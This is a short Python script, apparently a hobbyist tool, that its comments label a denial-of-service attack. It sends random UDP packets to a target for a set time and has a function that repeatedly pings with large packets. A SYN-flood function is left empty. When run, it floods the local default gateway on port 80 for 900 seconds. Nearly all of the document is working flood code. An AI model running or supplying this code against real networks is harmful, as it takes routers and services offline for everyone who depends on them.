import os
import sys
import netifaces
import random
import platform
import sys
import socket
import time

#Denial of service attack
def DOS(IP, port, times):
    if platform.system()[:3].lower()=="win":
	#Windows command prompt uses cls to clear the screen
        os.system("cls")
    else:
	#The other ones use clear
        os.system("clear")
#Opening a socket on IPv4(socket.AF_INET) and using UDP(socket.SOCK_DGRAM)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#Pick a random value
    bytes = random._urandom(1024)
#Timeout for that value
    timeoutValue = time.time() + times

    c = 0  # num of packets

#Run until interuppted
    while True:
        try:
            if time.time() > timeoutValue:
		#If the timeout value is reached then break the loop
                break
	#Send data through the socket to the target
            sock.sendto(bytes, (IP, port))
            c += 1
	#Increasing the amount of packets sent
            print("sent " + str(c) + " packets to " + IP + " through port " + str(port))
        except KeyboardInterrupt:
            quit()

#Get the default gateway
def getGateway():
    default_gateway=netifaces.gateways()
    # print(default_gateway)
    return default_gateway.get("default").get(2)[0]

#Ping the router; simplistic
def pingDataOverload(IP):
    for i in range(100000):
        os.system("ping "+IP+" 65500 -w 1 -n 1")

def synFlood(IP, port, numPackets): #implement later
	pass



# print(getGateway())
# pingDataOverload(getGateway())
DOS(getGateway(), 80, 900)
